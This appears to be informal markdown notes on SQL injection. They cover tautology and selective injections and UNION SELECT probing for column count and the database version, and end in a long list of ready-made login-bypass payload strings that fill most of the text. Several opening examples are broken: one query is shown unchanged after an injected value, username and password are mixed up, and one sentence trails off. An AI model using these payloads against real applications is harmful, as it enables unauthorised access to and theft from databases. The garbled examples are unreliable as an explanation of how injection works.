### SQL Injection

Takes advantage of using raw strings in your application.  You only have control of the space between the quotes.  You need to comment out the "after" using a comment that will be dependent on the sql backend.

 - Default
  - `Select * from accounts where username = ".$password"`
 - $password = 'password'
  - `Select * from accounts where username = "password"`
 - $password = 'password OR 1=1 --'
  - `Select * from accounts where username = "password"`
If you pass in the value of $password = 'password' it would look like 


Tautology - Where you select all rows
 - `Select * from accounts where username = 'foo' or 1 -- `
Selective injections - Specific row
 - `Select * from accounts where username = 'foo' --`

#### Union Select
YOu can use the above with a union select in order to send raw queries to the db to identify version and such of the database

 - null is castable to any data type
 - try until you get it, then we can do more interesting things

 - ' union select null -- 
 - ' union select null,null -- 
 - ' union select null,null,...til success, null -- 
 
Now we can do things like this to determine the mysql version
 - ' union select null, version(), null 

Or this to detect the order displayed
 - ' union select null, 1, null 
 

 - sql - 
   - `' or 1='1` 
   - `' and 1='0`
   - `1' OR 1 = 1#`

   - ') or true--
   - ') or ('')=('
   - ') or 1--
   - ') or ('x')=('
   - " or true--
   - " or ""="
   - " or 1--
   - " or "x"="
   - ") or true--
   - ") or ("")=("
   - ") or 1--
   - ") or ("x")=("
   - 
   - '-'
   - ' '
   - '&'
   - '^'
   - '*'
   - ' or ''-'
   - ' or '' '
   - ' or ''&'
   - ' or ''^'
   - ' or ''*'
   - "-"
   - " "
   - "&"
   - "^"
   - "*"
   - " or `""-"`